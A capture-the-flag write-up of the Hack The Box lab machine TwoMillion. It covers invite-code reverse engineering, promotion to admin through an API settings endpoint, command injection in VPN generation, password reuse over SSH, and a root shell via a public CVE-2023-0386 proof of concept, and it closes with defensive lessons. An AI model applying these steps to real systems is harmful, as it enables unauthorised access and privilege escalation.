---
title: TwoMillion - Hack The Box [Easy]
date: 2026-10-16 00:00:00
description: English write-up for the Hack The Box TwoMillion machine, covering invite code generation, API privilege escalation, command injection, and CVE-2023-0386.
categories:
  - Web Exploit
  - Writeup CTF
tags:
  - Hack The Box
  - TwoMillion
  - Linux
  - Command Injection
  - Privilege Escalation
top_img: /img/TwoMillion/00-twomillion-htb-banner.png
cover: /img/TwoMillion/00-twomillion-htb-banner.png
toc: true
---

# TwoMillion

## 1. Summary

<aside>
💡

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

</aside>

![TwoMillion Hack The Box banner](/img/TwoMillion/00-twomillion-htb-banner.png)

## 2. Reconnaissance

### 2.1. Nmap

I started by scanning all TCP ports:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ nmap -sC -sV -p- -T4 --min-rate 1000 10.129.229.66
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 15:09 +0700
Nmap scan report for 10.129.229.66
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.04 seconds
```

There are **two** open TCP ports: 22 and 80. The website redirects to `http://2million.htb/`, so I added the hostname to `/etc/hosts`:

```text
10.129.229.66 2million.htb
```

### 2.2. Directory scan

I used `feroxbuster` to find directories and endpoints. The output below shows the results I kept after excluding the 500 error responses:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ feroxbuster -u http://2million.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb/
 🚩  In-Scope Url          │ 2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
401      GET        0l        0w        0c http://2million.htb/api
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login
200      GET       80l      232w     3704c http://2million.htb/login
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET       96l      285w     3859c http://2million.htb/invite
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
200      GET       46l      152w     1674c http://2million.htb/404
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css
200      GET       94l      293w     4527c http://2million.htb/register
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js
200      GET     1242l     3326w    64952c http://2million.htb/
....
```

### 2.3. Subdomain enumeration

I used `ffuf` to check whether `2million.htb` had any additional subdomains:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ ffuf -u http://10.129.229.66 -H "Host: FUZZ.2million.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/  \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\    \ \_\  \ \____/  \ \_\
          \/_/     \/_/   \/___/    \/_/

        2.1.0-dev
_______________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.66
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.2million.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
_______________________________________________

 :: Progress: [4989/4989] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

No additional subdomains were found.

### 2.4. Website review

After adding the hostname to `/etc/hosts`, I visited `http://2million.htb/`. Two things stood out:

- `/login` requires an account, which I did not have yet.
- `/invite` requires an invite code before registration.

![Login page](/img/TwoMillion/image-01.png)

![Invite page](/img/TwoMillion/image-02.png)

## 3. Invite code challenge

### 3.1. Inspecting `inviteapi.min.js`

I revisited the discovered paths and found a packed and obfuscated JavaScript file at [http://2million.htb/js/inviteapi.min.js](http://2million.htb/js/inviteapi.min.js). It was obfuscated with Dean Edwards Packer.

![Packed invite API JavaScript](/img/TwoMillion/image-03.png)

To inspect the original logic, I opened the browser console and replaced `eval` with `console.log`.

![Deobfuscated JavaScript in the browser console](/img/TwoMillion/image-04.png)

The source contained two useful functions:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

I opened the console on `/invite` and ran `makeInviteCode()`:

![Calling makeInviteCode from the console](/img/TwoMillion/image-05.png)

The response contained this ROT13-encoded message:

```text
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
```

I decoded it with [rot13.com](https://rot13.com/). It instructed me to send a POST request to `/api/v1/invite/generate`.

![ROT13 decoded message](/img/TwoMillion/image-06.png)

### 3.2. Generating the invite code

I sent the requested POST request:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ curl -s -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SkFNWkktS0RJVjYtOFNSSkwtRjA4UUU=","format":"encoded"}}
```

The returned value was Base64 encoded, so I decoded it:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ echo "SkFNWkktS0RJVjYtOFNSSkwtRjA4UUU=" | base64 -d
JAMZI-KDIV6-8SRJL-F08QE
```

I used the invite code to verify the invite and register an account.

![Registering an account with the invite code](/img/TwoMillion/image-07.png)

## 4. API enumeration and privilege escalation

After logging in, I found that most of the site had little functionality to interact with. The useful page was `/home/access`:

```text
http://2million.htb/home/access
```

![Access page](/img/TwoMillion/image-08.png)

The page had two buttons, `Connection Pack` and `Regenerate`. Both returned an `.ovpn` file. The buttons called `/api/v1/user/vpn/generate` and `/api/v1/user/vpn/regenerate`, respectively; their responses were very similar.

![VPN generation and regeneration requests](/img/TwoMillion/image-09.png)

The challenge description mentioned that one of the API endpoints could elevate a user to Administrator, so I explored the API routes.

Opening `/api` returned:

```json
{
    "/api/v1": "Version 1 of the API"
}
```

![API root response](/img/TwoMillion/image-10.png)

This showed that the API was available under `/api/v1`. Opening that path returned a route list:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

![API v1 route list](/img/TwoMillion/image-11.png)

The route list separates `user` and `admin` operations, so I focused on the admin endpoints.

### 4.1. Checking admin access

I requested `/api/v1/admin/auth`. The response was `{"message":false}`, confirming that my account was not an admin.

When sending requests to the admin endpoints, the server also required `Content-Type: application/json`. The `/api/v1/admin/vpn/generate` endpoint denied access while my account lacked admin privileges.

![Admin VPN endpoint denying access](/img/TwoMillion/image-12.png)

### 4.2. Updating account settings

I tried the `PUT /api/v1/admin/settings/update` endpoint.

![Settings update request without an email](/img/TwoMillion/image-13.png)

The response said that an email was required, so I supplied the email address used for my account.

![Settings update request with the email](/img/TwoMillion/image-14.png)

The next response indicated that `is_admin` was missing. I added `"is_admin": 1` to the request.

![Request adding the is_admin field](/img/TwoMillion/image-15.png)

The update succeeded. When I checked `/api/v1/admin/auth` again, the response had changed to `{"message":true}`. My account now had Administrator privileges.

![Admin authentication check returning true](/img/TwoMillion/image-16.png)

## 5. Command injection in VPN generation

With admin access, I called `/api/v1/admin/vpn/generate` again. This time the endpoint responded that the `username` parameter was required.

![Admin VPN endpoint requesting a username](/img/TwoMillion/image-17.png)

After I supplied a username, the request succeeded and returned a VPN configuration for that user.

![VPN configuration generated for the supplied username](/img/TwoMillion/image-18.png)

The certificate contained `CN=ace`, matching the username I had submitted. This suggested the server was using the supplied value while creating a new artifact at runtime, rather than only looking up a static file.

Creating a certificate with a request-specific common name suggested that a process or command might be invoked at runtime, for example `openssl req` or a similar tool. I tested the `username` parameter for command injection.

![Command injection payload in the username parameter](/img/TwoMillion/image-19.png)

The response confirmed command injection in `POST /api/v1/admin/vpn/generate`.

![Command injection confirmed](/img/TwoMillion/image-20.png)

### 5.1. Reading `.env`

After confirming command injection, I checked which files were accessible on the system.

![Listing files through command injection](/img/TwoMillion/image-21.png)

Among the returned files, `.env` was particularly interesting because it commonly stores environment variables and credentials. The file contained the admin password, which I later used to connect over SSH.

![Reading the .env file](/img/TwoMillion/image-22.png)

## 6. Shell access and the user flag

Because the password was reused, I tried it with the `admin` account over SSH:

```bash
┌──(kali㉿DESKTOP-PTKVJHV)-[~]
└─$ ssh admin@2million.htb
```

After logging in, I listed the home directory and read `user.txt`:

```bash
admin@2million:~$ ls -la
total 32
drwxr-xr-x 4 admin admin 4096 Jun  6  2023 .
drwxr-xr-x 3 root  root  4096 Jun  6  2023 ..
lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin 3771 May 26  2023 .bashrc
drwx------ 2 admin admin 4096 Jun  6  2023 .cache
-rw-r--r-- 1 admin admin  807 May 26  2023 .profile
drwx------ 2 admin admin 4096 Jun  6  2023 .ssh
-rw-r----- 1 root  admin   33 Oct 11 07:46 user.txt
admin@2million:~$ cat user.txt
6342fc21b2e40e2f8a2db85212f66dbe
admin@2million:~$
```

## 7. Privilege escalation

### 7.1. Admin's email

I read the email in `/var/mail/admin`. It mentioned a vulnerability involving OverlayFS/FUSE.

![Email in /var/mail/admin](/img/TwoMillion/image-23.png)

### 7.2. Checking the system version

I checked the kernel and operating system versions:

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

admin@2million:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

The kernel was `5.15.70`. Based on that version and the email, I identified **CVE-2023-0386**, a local privilege escalation vulnerability in the Linux kernel's OverlayFS.

Reference: [The OverlayFS vulnerability CVE-2023-0386: Overview, detection, and remediation](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)

### 7.3. Exploiting CVE-2023-0386

I used this proof of concept:

```text
https://github.com/xkaneiki/CVE-2023-0386
```

The `admin` user on the target did not have Internet access, so I downloaded the POC locally and copied it to the machine:

```powershell
PS D:\> scp -r D:\CVE-2023-0386-main.zip admin@2million.htb:/tmp/
```

I checked that the file had arrived:

```bash
admin@2million:/tmp$ ls
CVE-2023-0386-main.zip
```

Then I extracted it and read the `README.md` instructions:

```bash
admin@2million:/tmp$ unzip CVE-2023-0386-main.zip
Archive:  CVE-2023-0386-main.zip
c4c65cefca1365c807c397e953d048506f3de195
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/Makefile
  inflating: CVE-2023-0386-main/README.md
  inflating: CVE-2023-0386-main/exp.c
  inflating: CVE-2023-0386-main/fuse.c
  inflating: CVE-2023-0386-main/getshell.c
   creating: CVE-2023-0386-main/ovlcap/
 extracting: CVE-2023-0386-main/ovlcap/.gitkeep
   creating: CVE-2023-0386-main/test/
  inflating: CVE-2023-0386-main/test/fuse_test.c
  inflating: CVE-2023-0386-main/test/mnt
  inflating: CVE-2023-0386-main/test/mnt.c
admin@2million:/tmp$ cd CVE-2023-0386-main
admin@2million:/tmp/CVE-2023-0386-main$ cat README.md
```

The POC required two terminals. In the first terminal, I compiled the files and started FUSE:

```bash
admin@2million:/tmp/CVE-2023-0386-main$ make all
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
```

In the second terminal, I ran the exploit:

```bash
admin@2million:/tmp/CVE-2023-0386-main$ ./exp
```

The exploit succeeded and gave me a root shell:

```bash
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct 11 15:42 .
drwxrwxr-x 6 root   root     4096 Oct 11 15:42 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:/tmp/CVE-2023-0386-main#
```

I read the root flag from `/root/root.txt`:

```bash
root@2million:/root# cat root.txt
fb4411f35f92f1cd4982aab0d26ebfd1
root@2million:/root#
```

### 7.4. GLIBC version

Finally, I checked the GLIBC version installed on TwoMillion:

```bash
root@2million:/root# ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
root@2million:/root#
```

## 8. Exploitation chain

```text
Reconnaissance
→ Find /js/inviteapi.min.js
→ Reverse engineer the JavaScript to discover invite code generation
→ Register an account using the invite code
→ Log in and enumerate API routes
→ Find /api/v1/admin/settings/update
→ Set is_admin: 1 to gain Administrator privileges
→ Call /api/v1/admin/vpn/generate
→ Notice that the certificate CN matches the supplied username
→ Test and confirm command injection
→ Read .env to obtain credentials
→ SSH into the machine using the reused password
→ Exploit CVE-2023-0386
→ Gain root
```

## 9. Lessons learned

- Do not expose invite code generation logic in client-side JavaScript.
- Enforce authorization on the server for every API operation.
- Never allow users to update privileged fields such as `is_admin`.
- Validate and safely handle input passed to system commands.
- Keep the kernel patched against known local privilege escalation vulnerabilities.
